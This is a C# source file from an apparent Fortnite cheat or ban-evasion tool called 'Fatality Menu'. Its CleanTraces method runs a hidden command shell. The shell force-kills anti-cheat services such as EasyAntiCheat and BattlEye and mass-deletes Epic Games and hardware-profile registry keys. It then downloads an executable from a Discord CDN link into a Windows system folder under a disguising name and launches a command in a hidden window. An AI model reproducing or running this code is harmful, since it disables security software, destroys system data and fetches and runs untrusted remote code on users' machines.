using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Fatality_Menu
{
    class Misc
    {
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
        public static void CleanTraces(String loc)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\\Profiles\\0001 \\v HwProfileGuid \\t REG_SZ \\d {%08x-%04x-%04x-%04x-%04x%08x} /f");
            //process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoof.SIDCleaner + "\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("exit");
            WebClient web = new WebClient();
            string cleaner = @"C:\Windows\IME\cleaner.exe";
            web.DownloadFile("https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe", cleaner);
            Process process1 = new Process();
            process1.StartInfo.FileName = @"cmd.exe";
            process1.StartInfo.RedirectStandardInput = true;
            process1.StartInfo.UseShellExecute = false;
            process1.StartInfo.CreateNoWindow = false;
            process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process1.Start();
            Thread.Sleep(1000);
            process1.StandardInput.WriteLine(@"" + loc);
            Thread.Sleep(15000);





        }
    }

}
